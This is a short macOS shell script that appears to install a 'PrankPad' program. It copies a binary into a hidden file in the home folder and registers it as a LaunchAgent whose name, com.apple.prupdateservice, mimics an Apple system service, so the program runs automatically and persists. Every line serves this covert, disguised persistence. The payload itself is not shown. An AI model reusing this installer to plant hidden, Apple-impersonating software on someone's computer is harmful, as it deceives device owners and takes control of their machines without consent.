#!/bin/sh

mkdir -p $HOME/Library/LaunchAgents/

cp prupdateservice $HOME/.prupdateservice
chmod +x $HOME/.prupdateservice

launchctl unload $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist
cp com.apple.prupdateservice.plist $HOME/Library/LaunchAgents/
launchctl load $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist

echo "PrankPad Successfully Installed"
